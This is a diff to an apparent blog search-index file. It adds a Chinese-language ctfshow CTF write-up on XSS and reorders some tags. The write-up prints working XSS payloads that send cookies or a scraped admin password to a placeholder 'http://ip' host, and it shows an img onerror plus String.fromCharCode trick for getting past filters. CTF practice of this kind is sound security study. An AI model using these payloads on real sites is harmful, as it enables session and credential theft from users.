@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>something-about-XSS-Challenges</title>
+      <link href="/2026/01/04/something-about-XSS-Challenges/"/>
+      <url>/2026/01/04/something-about-XSS-Challenges/</url>
+      
+        <content type="html"><![CDATA[<h2 id="ctfshow混合型XSS"><a href="#ctfshow混合型XSS" class="headerlink" title="ctfshow混合型XSS"></a>ctfshow混合型XSS</h2><p><img src="/../images/achieve/2025/12/image-20260104171728360.png" alt="image-20260104171728360"></p><p>注册个用户，有个签名的功能，管理员会审核，拿cookie</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  fetch(&#x27;http://ip/?cookie=&#x27; + encodeURIComponent(document.cookie));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>拿不到估计是开了<strong>http only</strong>，防止读取cookie！题目提示：获取管理员密码</p><p><img src="/../images/achieve/2025/12/image-20260104172448180.png" alt="image-20260104172448180"></p><p>登录之后账密全在网页源码里面，直接X就完了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&#x27;GET&#x27;, &#x27;/profile&#x27;, true);</span><br><span class="line">xhr.onload = function() &#123;</span><br><span class="line">var pass = this.responseText.match(/id=&quot;upass&quot;.*?&gt;(.*?)&lt;<span class="keyword">\/</span>div&gt;/)[1];</span><br><span class="line">fetch(&#x27;http://ip/?p=&#x27; + btoa(pass));</span><br><span class="line">&#125;;</span><br><span class="line">xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20260104173307039.png" alt="image-20260104173307039"></p><p>base64解码之后就是flag</p><h2 id="ctfshow编码绕过XSS过滤"><a href="#ctfshow编码绕过XSS过滤" class="headerlink" title="ctfshow编码绕过XSS过滤"></a>ctfshow编码绕过XSS过滤</h2><p>自己fuzz出来过滤了script和&#x2F;，那么首先是上一个payload的标签就不能用来（大小写没绕过），用img标签</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=xss onerror=alert(&#x27;ljf666&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>在onerror写入我们的js代码，只不过&#x2F;这个没了，我们可以编码一下。参考：<a href="https://developer.aliyun.com/article/1575647">XSS绕过技巧大全从空格编码到JS伪协议-开发者社区-阿里云</a></p><p>这里写了个脚本转化成ascii</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_ascii</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="comment"># 使用 ord() 获取每个字符的 ASCII 值，并转为字符串</span></span><br><span class="line">    ascii_values = [<span class="built_in">str</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> text]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用逗号连接</span></span><br><span class="line">    result = <span class="string">&quot;,&quot;</span>.join(ascii_values)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互输入</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="built_in">input</span>(<span class="string">&quot;请输入要转换的代码: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n转换后的 ASCII 序列为:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(string_to_ascii(payload))</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();xhr.open(&#x27;GET&#x27;, &#x27;/profile&#x27;, true);xhr.onload = function()&#123;var pass = this.responseText.match(/id=&quot;upass&quot;.*?&gt;(.*?)&lt;<span class="keyword">\/</span>div&gt;/)[1];fetch(&#x27;http://ip/?p=&#x27; + btoa(pass));&#125;;xhr.send();//这部分的ascii码填入payload就好了</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode())&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> xss </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xss劫持密码 </tag>
+            
+            <tag> xss编码绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>kali配置代理下载GitHack</title>
       <link href="/2025/12/27/kali%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%8B%E8%BD%BDGitHack/"/>
       <url>/2025/12/27/kali%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E4%B8%8B%E8%BD%BDGitHack/</url>
@@ -326,9 +353,9 @@
       
         <tags>
             
-            <tag> ssti </tag>
-            
             <tag> 文件包含 </tag>
+            
+            <tag> ssti </tag>
             
             <tag> fastapi内存马 </tag>
             
@@ -357,9 +384,9 @@
       
         <tags>
             
-            <tag> flask </tag>
-            
             <tag> 内存马 </tag>
+            
+            <tag> flask </tag>
             
         </tags>
       
